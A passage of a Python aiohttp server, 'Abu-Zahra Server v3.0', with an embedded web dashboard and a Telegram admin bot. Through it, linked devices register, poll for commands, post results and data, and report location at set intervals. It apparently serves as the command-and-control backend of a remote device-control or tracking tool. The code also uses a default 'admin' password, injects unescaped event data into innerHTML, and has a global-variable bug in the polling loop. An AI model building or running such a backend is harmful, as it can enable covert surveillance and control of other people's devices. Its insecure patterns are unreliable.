el.innerHTML=(r.events||[]).slice(-50).reverse().map(e=>`<div class="log-item"><span class="time">${(e.time||'').slice(0,19)}</span><span class="event">${e.event} ${e.details?JSON.stringify(e.details).slice(0,60):''}</span></div>`).join('')||'<div class="empty">No events</div>';
}
}

async function loadSettings(){
const r=await api('web/settings');
if(r.ok){
const s=r.settings;
document.getElementById('settingsForm').innerHTML=`
<label style="display:block;margin-bottom:12px">🔑 Admin Password<input id="setPass" value="${s.admin_password||'admin'}" style="display:block;width:100%;padding:8px;border-radius:6px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px"></label>
<label style="display:block;margin-bottom:12px">⏱️ Sync Interval (sec)<input id="setSync" type="number" value="${s.sync_interval||300}" style="display:block;width:100%;padding:8px;border-radius:6px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px"></label>
<label style="display:block;margin-bottom:12px">📍 Location Interval (sec)<input id="setLoc" type="number" value="${s.location_interval||60}" style="display:block;width:100%;padding:8px;border-radius:6px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px"></label>
<label style="display:block;margin-bottom:12px">🌐 Language<select id="setLang" style="display:block;width:100%;padding:8px;border-radius:6px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px"><option value="ar" ${s.language==='ar'?'selected':''}>Arabic</option><option value="en" ${s.language==='en'?'selected':''}>English</option></select></label>
<label style="display:flex;align-items:center;gap:8px;margin-bottom:12px"><input type="checkbox" id="setNotif" ${s.notifications?'checked':''}> 🔔 Notifications</label>
<label style="display:flex;align-items:center;gap:8px;margin-bottom:12px"><input type="checkbox" id="setAutoLoc" ${s.auto_location?'checked':''}> 🗺️ Auto Location</label>
<label style="display:flex;align-items:center;gap:8px;margin-bottom:12px"><input type="checkbox" id="setAutoSync" ${s.auto_sync?'checked':''}> 🔄 Auto Sync</label>`;
}
}

async function saveSettings(){
const data={
admin_password:document.getElementById('setPass').value,
sync_interval:parseInt(document.getElementById('setSync').value),
location_interval:parseInt(document.getElementById('setLoc').value),
language:document.getElementById('setLang').value,
notifications:document.getElementById('setNotif').checked,
auto_location:document.getElementById('setAutoLoc').checked,
auto_sync:document.getElementById('setAutoSync').checked,
};
const r=await api('web/settings',{method:'PUT',body:JSON.stringify(data)});
if(r.ok)notify('Settings saved!');else notify('Failed','var(--accent)');
}

if(TOKEN){showApp();}
initCmdTabs();
setTimeout(loadSettings,500);
</script>
</body>
</html>"""

# ============================================================================
# WEB DASHBOARD ROUTE
# ============================================================================

async def serve_dashboard(request):
    return web.Response(text=DASHBOARD_HTML, content_type="text/html", charset="utf-8")

# ============================================================================
# GETUPDATES POLLING
# ============================================================================

async def tg_poll_loop():
    global tg_offset, polling_active
    polling_active = True
    log.info("Starting Telegram getUpdates polling...")
    
    while polling_active:
        try:
            payload = {
                "offset": tg_offset,
                "timeout": 30,
                "allowed_updates": ["message", "callback_query"],
            }
            result = await tg_request("getUpdates", payload)
            if not result or not result.get("ok"):
                await asyncio.sleep(2)
                continue
            
            updates = result.get("result", [])
            for update in updates:
                update_id = update.get("update_id", 0)
                tg_offset = update_id + 1
                
                # === منع تكرار معالجة نفس التحديث ===
                if update_id in _processed_update_ids:
                    continue
                _processed_update_ids.add(update_id)
                if len(_processed_update_ids) > 1000:
                    _processed_update_ids = set(list(_processed_update_ids)[-500:])
                
                # Handle message
                if "message" in update:
                    msg = update["message"]
                    chat_id = msg.get("chat", {}).get("id")
                    text = msg.get("text", "")
                    from_user = msg.get("from", {}).get("id")
                    
                    if chat_id != ADMIN_CHAT_ID:
                        log.warning("Unauthorized access from %s", chat_id)
                        continue
                    
                    if text.startswith("/"):
                        await handle_telegram_command(chat_id, text, msg.get("message_id"))
                
                # Handle callback query
                if "callback_query" in update:
                    cb = update["callback_query"]
                    cb_chat = cb.get("message", {}).get("chat", {}).get("id")
                    if cb_chat != ADMIN_CHAT_ID:
                        continue
                    await handle_callback_query(cb)
        
        except asyncio.CancelledError:
            break
        except Exception as exc:
            log.error("Poll error: %s", exc)
            await asyncio.sleep(3)

# ============================================================================
# SESSION CLEANUP TASK
# ============================================================================

async def session_cleanup_loop():
    while True:
        try:
            sessions = load_json(SESSIONS_FILE, [])
            now = datetime.now(timezone.utc)
            active = []
            for s in sessions:
                try:
                    expires = datetime.fromisoformat(s.get("expires_at", "")).replace(tzinfo=timezone.utc)
                    if now <= expires:
                        active.append(s)
                except:
                    continue
            save_json(SESSIONS_FILE, active)
            
            # Also clean expired link codes
            codes = load_json(LINK_CODES_FILE, [])
            valid = []
            for c in codes:
                try:
                    expires = datetime.fromisoformat(c.get("expires_at", "")).replace(tzinfo=timezone.utc)
                    if now <= expires or c.get("used"):
                        valid.append(c)
                except:
                    continue
            save_json(LINK_CODES_FILE, valid)
        except:
            pass
        await asyncio.sleep(3600)

# ============================================================================
# APP FACTORY & ROUTES
# ============================================================================

def create_app():
    app = web.Application()
    
    # Web Dashboard
    app.router.add_get("/", serve_dashboard)
    app.router.add_get("/dashboard", serve_dashboard)
    
    # Auth API
    app.router.add_post("/api/login", api_web_login)
    
    # Device API (no auth - device authenticates via link code/token)
    app.router.add_post("/api/verify_link", api_verify_link)
    app.router.add_post("/api/register", api_register)
    app.router.add_get("/api/commands/{device_id}", api_get_commands)
    app.router.add_post("/api/command_result/{command_id}", api_command_result)
    app.router.add_post("/api/data/{device_id}", api_device_data)
    app.router.add_get("/api/settings/{device_id}", api_device_settings)
    
    # Web API (requires auth)
    app.router.add_get("/api/web/devices", api_web_devices)
    app.router.add_get("/api/web/device/{device_id}", api_web_device_detail)
    app.router.add_get("/api/web/commands", api_web_commands)
    app.router.add_get("/api/web/events", api_web_events)
    app.router.add_get("/api/web/stats", api_web_stats)
    app.router.add_post("/api/web/send_command", api_web_send_command)
    app.router.add_get("/api/web/link_code", api_web_link_code)
    app.router.add_get("/api/web/settings", api_web_settings_get)
    app.router.add_put("/api/web/settings", api_web_settings_set)
    app.router.add_delete("/api/web/unlink/{device_id}", api_web_unlink)
    
    # Static files
    static_dir = Path(__file__).parent / "static"
    if static_dir.exists():
        app.router.add_static("/static", static_dir)
    
    return app


async def on_startup(app):
    ensure_data_dir()
    log.info("=" * 60)
    log.info("Abu-Zahra Server v3.0 starting...")
    log.info("Domain: %s", SERVER_DOMAIN)
    log.info("Port: %d", SERVER_PORT)
    log.info("Admin: %d", ADMIN_CHAT_ID)
    log.info("Commands: %d", len(COMMAND_REGISTRY))
    log.info("=" * 60)
    
    # Start Telegram polling in background
    app["tg_task"] = asyncio.create_task(tg_poll_loop())
    # Start session cleanup
    app["cleanup_task"] = asyncio.create_task(session_cleanup_loop())
    
    # Notify admin
    try:
        await send_admin(
            f"🟥 <b>Abu-Zahra Server v3.0</b> started!\n\n"
            f"📡 Port: <code>{SERVER_PORT}</code>\n"
            f"🌐 Domain: <code>{SERVER_DOMAIN}</code>\n"
            f"📋 Commands: <code>{len(COMMAND_REGISTRY)}</code>\n"
            f"📱 Web: <code>{SERVER_DOMAIN}/dashboard</code>"
        )
    except:
        pass


async def on_cleanup(app):
    global polling_active
    polling_active = False
    if "tg_task" in app:
        app["tg_task"].cancel()
    if "cleanup_task" in app:
        app["cleanup_task"].cancel()
    global _tg_session
    if _tg_session and not _tg_session.closed:
        await _tg_session.close()


def main():
    app = create_app()
    app.on_startup.append(on_startup)
    app.on_cleanup.append(on_cleanup)
    
    log.info("Starting server on port %d...", SERVER_PORT)
    web.run_app(app, host="0.0.0.0", port=SERVER_PORT, print=None)


if __name__ == "__main__":
    main()
